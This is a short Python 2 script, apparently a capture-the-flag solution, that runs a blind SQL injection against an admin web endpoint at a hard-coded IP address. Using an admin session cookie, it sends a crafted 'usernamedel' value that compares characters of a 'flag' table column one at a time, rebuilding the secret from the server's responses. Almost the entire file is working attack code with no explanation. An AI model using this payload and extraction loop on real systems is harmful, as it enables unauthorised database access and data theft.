# -*- coding: cp936 -*-
import urllib2
import urllib
def check_url(payload):
    header = {
        'Cookie':'session=eyJuYW1lIjoiYWRtaW4ifQ.XCBksQ.yDlnipMHbar9AedCza9aD-xmgSI'
    }
    adddata = {
        'username':'xiaomeiqiu',
        'password':'1'}
    url="http://172.93.39.218:8888/admin"
    postdata = {
        'usernamedel':payload,
        'submit':'1'
        }
    adddata=urllib.urlencode(adddata)
    postdata=urllib.urlencode(postdata)
    request = urllib2.Request(url,adddata,header)
    request1 = urllib2.Request(url,postdata,header)
    response = urllib2.urlopen(request)
    response1 = urllib2.urlopen(request1)
    html = response1.read()
    #print html
    return 'xiaomeiqiu' in html

def set_payload():
    a=''
    for j in range(33,40):
        for i in range(47,128):
            payload="xiaomeiqiu' and (hex(substr((select flag FROM flag),%s,1))>hex('%s'))--"%(j,chr(i))
            #print payload
            b=check_url(payload)
            #print b
            if(b):
                a=a+chr(i)
                print a
                break

set_payload()
